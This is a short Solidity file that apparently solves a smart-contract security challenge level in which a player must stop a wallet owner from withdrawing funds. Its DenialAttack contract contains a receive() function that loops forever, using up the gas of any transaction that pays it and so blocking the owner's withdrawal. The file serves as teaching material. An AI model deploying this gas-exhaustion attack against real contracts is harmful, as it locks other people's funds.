// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.
//
// If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

interface IDenial {
  function withdraw() external;
}

contract DenialAttack {
  IDenial victim;

  constructor(address _targetContract) {
    victim = IDenial(_targetContract);
  }

  receive() external payable {
    while (true) {} //Trx runs out of gas, funds are locked
  }
}
